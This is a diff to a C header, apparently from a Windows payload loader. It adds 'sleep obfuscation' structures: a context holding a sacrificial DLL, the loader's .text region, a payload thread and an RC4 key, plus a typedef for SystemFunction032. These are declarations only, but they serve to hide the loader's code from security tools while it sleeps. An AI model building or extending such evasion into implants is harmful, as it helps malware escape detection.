@@ -79,6 +79,26 @@
 #define CALL_FAR_QPTR   0x0015FF48
 
 /*===================================
+# Sleep Obfuscation
+=====================================*/
+typedef struct _USTRING {
+    DWORD   Length;
+    DWORD   MaximumLength;
+    PBYTE   Buffer;
+} USTRING, * PUSTRING;
+
+typedef struct _SLEEP_CONTEXT {
+    PVOID       pModule;            // Sacrificial DLL base
+    PVOID       pTextBase;          // Loader .text base
+    SIZE_T      szTextSize;         // Loader .text size
+    HANDLE      hPayloadThread;     // Payload thread handle
+    HANDLE      hHeap;              // Process heap
+    BYTE        Key[16];            // RC4 key
+    DWORD       dwKeySize;          // Key size
+    DWORD       dwSleepMs;          // Sleep interval
+} SLEEP_CONTEXT, * PSLEEP_CONTEXT;
+
+/*===================================
 # Unwind Flags
 =====================================*/
 #ifndef UNW_FLAG_EHANDLER
@@ -93,6 +113,7 @@
 typedef VOID(NTAPI* fnLdrProtectMrdata)(_In_ BOOL Protect);
 typedef VOID(NTAPI* fnRtlAcquireSRWLockExclusive)(_Inout_ PRTL_SRWLOCK SRWLock);
 typedef VOID(NTAPI* fnRtlReleaseSRWLockExclusive)(_Inout_ PRTL_SRWLOCK SRWLock);
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(_Inout_ PUSTRING Data, _In_ PUSTRING Key);
 
 /*===================================
 # Typedefs
